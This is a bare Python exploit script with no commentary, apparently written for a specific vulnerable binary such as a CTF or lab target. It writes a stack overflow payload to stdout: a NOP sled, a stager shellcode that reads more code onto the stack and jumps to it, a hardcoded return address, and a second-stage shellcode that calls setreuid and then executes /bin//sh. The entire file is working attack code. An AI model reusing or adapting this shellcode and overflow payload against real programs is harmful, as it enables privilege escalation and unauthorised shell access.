import sys
import struct

stager_payload = b"\x31\xC0\x31\xFF\x48\x89\xE6\x6A\x40\x5A\x0F\x05\xFF\xE4"

exploit = b""
exploit += b"\x90"*(32 - len(stager_payload)) + stager_payload
exploit += b"C"*16
exploit += struct.pack("Q", 0x7fffffffe200)
exploit += b"C"*8
exploit += b"\x28"

sys.stdout.buffer.write(exploit)

stage_payload = b"1\xfff\xbf\xfb\x03jqXH\x89\xfe\x0f\x05"
stage_payload += b"\x31\xD2\x52\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x89\xE7\x31\xF6\x48\x31\xC0\xB0\x3B\x0F\x05"

sys.stdout.buffer.write(stage_payload)